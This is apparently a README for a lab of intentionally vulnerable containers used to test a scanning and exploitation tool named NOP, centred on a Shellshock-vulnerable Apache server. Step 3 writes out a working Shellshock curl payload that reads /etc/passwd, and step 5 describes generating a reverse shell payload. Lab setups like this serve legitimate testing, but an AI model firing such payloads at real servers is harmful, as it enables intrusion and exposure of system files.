# Test Environment - Vulnerable Targets

## Overview
This directory contains intentionally vulnerable services for testing the NOP vulnerability scanning and exploitation features.

## Current Vulnerable Targets

### 1. Shellshock Apache (CVE-2014-6271)
**Container**: `shellshock-apache`  
**IP**: 172.21.0.25  
**Port**: 80 (mapped to 8888 on host)  
**Vulnerability**: Shellshock (CVE-2014-6271)  
**CVSS**: 10.0 (Critical)

**Details**:
- Apache 2.4.7 with CGI enabled
- Vulnerable bash 4.3.11
- Test CGI script at `/cgi-bin/test.cgi`

**How to Test**:
1. **Start the container**:
   ```bash
   cd /workspaces/NOP/test-environment
   docker-compose up -d shellshock-apache
   ```

2. **Verify it's running**:
   ```bash
   curl http://localhost:8888/
   ```

3. **Test Shellshock manually**:
   ```bash
   curl -H "User-Agent: () { :; }; /bin/cat /etc/passwd" \
        http://localhost:8888/cgi-bin/test.cgi
   ```

4. **Scan with NOP**:
   - Navigate to Scans page
   - Create new scan with target: `172.21.0.25` or `localhost:8888`
   - Run port scan (should detect port 80)
   - Run vulnerability scan
   - Should detect CVE-2014-6271 with exploit available

5. **Exploit with NOP**:
   - Go to Exploit/Access page
   - Select the shellshock-apache asset
   - Click "Build Exploit" on CVE-2014-6271
   - Generate reverse shell payload
   - Execute and verify shell connection

## Network Configuration
- **Network**: test-network
- **Subnet**: 172.21.0.0/16
- **Gateway**: 172.21.0.1

## Other Test Targets
- SSH Server: 172.21.0.10:22
- Web Server: 172.21.0.20:80
- FTP Server: 172.21.0.30:21
- Database: 172.21.0.40:3306
- VNC: 172.21.0.50:5900
- RDP: 172.21.0.60:3389
- SMB: 172.21.0.70:445

## Security Warning
⚠️ **THESE ARE INTENTIONALLY VULNERABLE SYSTEMS**  
- Only use in isolated test environment
- Never expose these containers to external networks
- Never use in production
